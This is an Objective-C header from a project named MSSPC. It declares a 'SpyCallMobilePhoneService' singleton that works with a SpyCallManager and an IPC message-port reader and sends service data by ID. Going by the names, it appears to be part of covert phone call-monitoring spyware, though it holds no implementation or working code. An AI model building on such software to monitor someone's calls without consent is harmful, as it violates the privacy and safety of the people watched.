//
//  SpyCallMobilePhoneService.h
//  MSSPC
//
//  Created by Makara Khloth on 3/12/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

#import "MessagePortIPCReader.h"

@class SpyCallManager;

@interface SpyCallMobilePhoneService : NSObject <MessagePortIPCDelegate> {
@private
	SpyCallManager	*mSpyCallManager;
	MessagePortIPCReader	*mMessagePortReader;
	BOOL	mServiceIsOn;
}

@property (nonatomic, assign) SpyCallManager *mSpyCallManager;

+ (id) sharedService;
+ (id) sharedServiceWithSpyCallManager: (SpyCallManager *) aSpyCallManager;

- (void) sendService: (NSInteger) aServiceID withServiceData: (id) aData;

@end
